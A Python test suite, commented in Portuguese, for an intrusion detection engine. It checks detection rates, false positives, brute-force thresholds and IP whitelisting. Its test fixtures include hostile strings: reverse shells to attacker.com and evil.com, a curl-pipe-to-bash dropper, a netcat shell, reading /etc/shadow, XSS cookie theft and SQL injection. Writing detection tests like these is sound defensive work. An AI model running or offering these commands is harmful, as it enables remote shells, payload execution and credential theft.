#!/usr/bin/env python3
"""
IDS Test Suite v2.0
Valida dois critérios fundamentais de produção:
  1. Taxa de DETECÇÃO: ataques conhecidos DEVEM ser detectados
  2. Taxa de FALSO POSITIVO: tráfego legítimo NÃO deve ser detectado

Execute com: python test_ids.py
"""

import sys
import json
import time
from ids_engine import IDSEngine, LogProcessor

# ─────────────────────────────────────────────
#  Helpers de output
# ─────────────────────────────────────────────

RED    = '\033[91m'
GREEN  = '\033[92m'
YELLOW = '\033[93m'
CYAN   = '\033[96m'
BOLD   = '\033[1m'
RESET  = '\033[0m'

def ok(msg):  print(f"  {GREEN}✓{RESET} {msg}")
def fail(msg):print(f"  {RED}✗{RESET} {msg}")
def info(msg):print(f"  {CYAN}·{RESET} {msg}")

def section(title):
    print(f"\n{BOLD}{CYAN}{'─'*60}{RESET}")
    print(f"{BOLD}{CYAN}  {title}{RESET}")
    print(f"{BOLD}{CYAN}{'─'*60}{RESET}")

# ─────────────────────────────────────────────
#  Casos de teste
# ─────────────────────────────────────────────

# (log, ip, context, description)
ATTACK_CASES = [
    # SQL Injection — UNION
    (
        "GET /login?id=1%20UNION%20SELECT%20null,null,null-- HTTP/1.1",
        "10.0.0.99",
        {"field": "url"},
        "SQL Injection UNION-based via URL"
    ),
    # SQL Injection — comment terminator
    (
        "username=admin'--&password=anything",
        "10.0.0.98",
        {"field": "query_string"},
        "SQL Injection — comment terminator"
    ),
    # SQL Injection — stacked query
    (
        "id=1; DROP TABLE users; --",
        "10.0.0.97",
        {"field": "url"},
        "SQL Injection — stacked DROP TABLE"
    ),
    # XSS script tag
    (
        "<script>alert(document.cookie)</script>",
        "10.0.0.80",
        {"field": "body"},
        "XSS — script tag com cookie exfil"
    ),
    # XSS event handler
    (
        '<img src=x onerror="fetch(document.cookie)">',
        "10.0.0.81",
        {"field": "body"},
        "XSS — event handler onerror"
    ),
    # Command injection — shell redirect
    (
        "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
        "10.0.0.70",
        {"field": "command"},
        "Command Injection — reverse shell clássico"
    ),
    # Command injection — pipe to bash
    (
        "curl http://evil.com/drop.sh | bash",
        "10.0.0.71",
        {"field": "command"},
        "Command Injection — dropper via curl|bash"
    ),
    # Path traversal (2+ níveis)
    (
        "GET /files/../../etc/passwd HTTP/1.1",
        "10.0.0.60",
        {"field": "url"},
        "Path Traversal — 2 níveis"
    ),
    # Privilege escalation
    (
        "sudo /bin/bash",
        "10.0.0.50",
        {"field": "syslog"},
        "Privilege Escalation — sudo shell interativo"
    ),
    # Reverse shell netcat
    (
        "nc 10.0.0.1 4444 -e /bin/bash",
        "10.0.0.40",
        {"field": "command"},
        "Reverse Shell — netcat com -e"
    ),
    # Reverse shell python
    (
        "python3 -c 'import socket; s=socket.socket()'",
        "10.0.0.41",
        {"field": "command"},
        "Reverse Shell — Python socket"
    ),
    # Credential dumping
    (
        "cat /etc/shadow",
        "10.0.0.30",
        {"field": "command"},
        "Credential Dumping — /etc/shadow"
    ),
    # Port scanning
    (
        "nmap -sS -p1-65535 192.168.1.0/24",
        "172.16.0.10",
        {"field": "command"},
        "Port Scanning — nmap SYN scan"
    ),
    # DDoS log
    (
        "syn flood detected from 203.0.113.0/24 rate=50000pps",
        "203.0.113.1",
        {"field": "firewall"},
        "DDoS — SYN flood log"
    ),
]

# Tráfego legítimo que NÃO deve disparar alertas
LEGIT_CASES = [
    # SELECT legítimo em log de app (não é SQLi)
    (
        "DEBUG: SELECT COUNT(*) FROM sessions WHERE active=1",
        "192.168.1.10",
        {"field": "syslog"},
        "SELECT legítimo em log de app"
    ),
    # Login bem-sucedido
    (
        "Jan 15 10:20:33 server sshd[1234]: Accepted publickey for deploy from 192.168.1.50 port 22",
        "192.168.1.50",
        {"field": "syslog"},
        "SSH login bem-sucedido"
    ),
    # Falha SSH única (abaixo do threshold)
    (
        "Jan 15 10:20:34 server sshd[1234]: Failed password for user bob from 192.168.1.30 port 22",
        "192.168.1.30",
        {"field": "syslog"},
        "SSH falha isolada (< threshold)"
    ),
    # GET normal em Apache
    (
        '192.168.1.20 - alice [15/Jan/2024:10:20:31 +0000] "GET /index.html HTTP/1.1" 200 5432',
        "192.168.1.20",
        {"field": "url"},
        "GET legítimo Apache"
    ),
    # POST de API normal
    (
        '10.0.0.5 - - [15/Jan/2024:10:20:32 +0000] "POST /api/login HTTP/1.1" 200 45',
        "10.0.0.5",
        {"field": "url"},
        "POST login legítimo"
    ),
    # Cron legítimo
    (
        "Jan 15 10:20:35 server cron[5678]: (root) CMD (/usr/bin/backup.sh)",
        "127.0.0.1",
        {"field": "syslog"},
        "Cron job legítimo"
    ),
    # sudo legítimo (não é shell interativo)
    (
        "sudo apt-get update",
        "192.168.1.5",
        {"field": "command"},
        "sudo para apt (não é shell interativo)"
    ),
    # Path com apenas 1 nível de ../
    (
        "GET /assets/../images/logo.png HTTP/1.1",
        "192.168.1.15",
        {"field": "url"},
        "Path com 1 nível de .. (legítimo)"
    ),
    # Log de backup com SELECT
    (
        "mysqldump: SELECT * FROM information_schema.tables completed",
        "192.168.1.100",
        {"field": "syslog"},
        "mysqldump legítimo com SELECT"
    ),
    # Monitoramento interno (whitelist)
    (
        "GET /api/health HTTP/1.1 200",
        "127.0.0.1",
        {"field": "url"},
        "Health check interno (127.0.0.1 na whitelist)"
    ),
]

# ─────────────────────────────────────────────
#  Runner principal
# ─────────────────────────────────────────────

def run_tests():
    print(f"\n{BOLD}{CYAN}")
    print("""
  ╔═══════════════════════════════════════════════╗
  ║   IDS v2.0 — Test Suite                      ║
  ║   Detecção + Controle de Falsos Positivos    ║
  ╚═══════════════════════════════════════════════╝
    """)
    print(RESET)

    # Engine com DB em memória para testes isolados
    ids = IDSEngine(db_path=":memory:")
    processor = LogProcessor()

    # ── 1. Testes de detecção ─────────────────────────────────────
    section("1 / TESTES DE DETECÇÃO (ataques devem ser detectados)")

    detection_pass = 0
    detection_fail = 0

    for log, ip, ctx, desc in ATTACK_CASES:
        events = ids.analyze(log, ip, ctx)
        if events:
            detection_pass += 1
            sev = events[0].severity.upper()
            name = events[0].threat_name
            ok(f"[{sev}] {desc}")
            info(f"   → {name}")
        else:
            detection_fail += 1
            fail(f"MISSED: {desc}")
            info(f"   log: {log[:80]}")

    print()
    total_d = detection_pass + detection_fail
    pct_d = round(detection_pass / total_d * 100, 1)
    color = GREEN if pct_d >= 90 else YELLOW if pct_d >= 70 else RED
    print(f"  {color}Detecção: {detection_pass}/{total_d} ({pct_d}%){RESET}")

    # ── 2. Testes de falso positivo ───────────────────────────────
    section("2 / TESTES DE FALSO POSITIVO (legítimo NÃO deve disparar)")

    fp_pass = 0
    fp_fail = 0

    for log, ip, ctx, desc in LEGIT_CASES:
        events = ids.analyze(log, ip, ctx)
        if not events:
            fp_pass += 1
            ok(f"Correto — sem alerta: {desc}")
        else:
            fp_fail += 1
            names = ", ".join(e.threat_name for e in events)
            fail(f"FALSO POSITIVO: {desc}")
            info(f"   → disparou: {names}")

    print()
    total_fp = fp_pass + fp_fail
    pct_fp = round(fp_pass / total_fp * 100, 1)
    color_fp = GREEN if pct_fp >= 95 else YELLOW if pct_fp >= 80 else RED
    print(f"  {color_fp}Legítimos sem alerta: {fp_pass}/{total_fp} ({pct_fp}%){RESET}")

    # ── 3. Teste de threshold / brute force ───────────────────────
    section("3 / THRESHOLD — Brute Force SSH (5 falhas em 60s)")

    brute_ip = "172.16.100.5"
    brute_log = f"Failed password for invalid user root from {brute_ip} port 22"
    brute_ctx = {"field": "syslog"}

    # IDS fresco para este teste
    ids2 = IDSEngine(db_path=":memory:")
    detections_at = []

    for i in range(1, 8):
        events = ids2.analyze(brute_log, brute_ip, brute_ctx)
        thresh_events = [e for e in events if e.method == "threshold"]
        if thresh_events:
            detections_at.append(i)

    if detections_at:
        # Deve disparar exatamente na 5a tentativa
        if 5 in detections_at:
            ok(f"Brute force detectado na tentativa #{detections_at[0]} (esperado: 5)")
        else:
            fail(f"Disparou nas tentativas {detections_at} (esperado: 5)")
    else:
        fail("Threshold de brute force nunca disparou")

    # ── 4. Teste de whitelist ─────────────────────────────────────
    section("4 / WHITELIST — IPs internos não geram alertas")

    wl_cases = [
        ("127.0.0.1",   "SELECT * FROM users UNION SELECT null,null", {"field": "url"}, "loopback"),
        ("192.168.1.1",  "bash -i >& /dev/tcp/evil.com/4444 0>&1",   {"field": "command"}, "gateway"),
    ]

    ids3 = IDSEngine(db_path=":memory:", whitelist_ips=["127.0.0.1", "192.168.1.1"])
    for ip, log, ctx, desc in wl_cases:
        events = ids3.analyze(log, ip, ctx)
        if not events:
            ok(f"Whitelisted corretamente: {ip} ({desc})")
        else:
            fail(f"Whitelist falhou para {ip}: {[e.threat_name for e in events]}")

    # ── 5. Log processor ─────────────────────────────────────────
    section("5 / LOG PROCESSOR — Detecção automática de formato")

    samples = [
        ("Jan 15 10:20:33 web sshd[1234]: Failed password for root from 10.0.0.5 port 22", "syslog"),
        ('192.168.1.1 - - [01/Jan/2024:00:00:00 +0000] "GET /login HTTP/1.1" 200 1234', "apache"),
        ("IN=eth0 OUT= SRC=10.0.0.5 DST=192.168.1.1 PROTO=TCP DPT=22", "firewall"),
    ]

    for log, expected_fmt in samples:
        detected = processor.detect_format(log)
        if detected == expected_fmt:
            ok(f"Formato detectado: {detected} ✓")
        else:
            fail(f"Esperado '{expected_fmt}', detectou '{detected}'")

    # ── Resumo final ──────────────────────────────────────────────
    section("RESUMO FINAL")

    stats = ids.get_statistics()

    results = [
        ("Taxa de Detecção",    f"{pct_d}%",   pct_d  >= 90),
        ("Controle FP",         f"{pct_fp}%",  pct_fp >= 95),
    ]

    for label, value, passed in results:
        c = GREEN if passed else RED
        s = "PASS" if passed else "FAIL"
        print(f"  {c}{s}{RESET}  {label}: {value}")

    print()
    if all(p for _,_,p in results):
        print(f"  {GREEN}{BOLD}✓ Engine pronto para produção{RESET}")
    else:
        print(f"  {YELLOW}{BOLD}⚠ Ajustes necessários antes de produção{RESET}")

    # Exportação de exemplo
    section("EXPORTAÇÃO")
    csv_out = ids.export("csv")
    lines = csv_out.split('\n')
    info(f"CSV gerado: {len(lines)-1} linhas de dados")
    info(f"Exemplo (linha 2): {lines[1] if len(lines) > 1 else 'vazio'}")

    print()

if __name__ == "__main__":
    try:
        run_tests()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Interrompido{RESET}")
    except Exception as e:
        import traceback
        print(f"\n{RED}Erro: {e}{RESET}")
        traceback.print_exc()
        sys.exit(1)
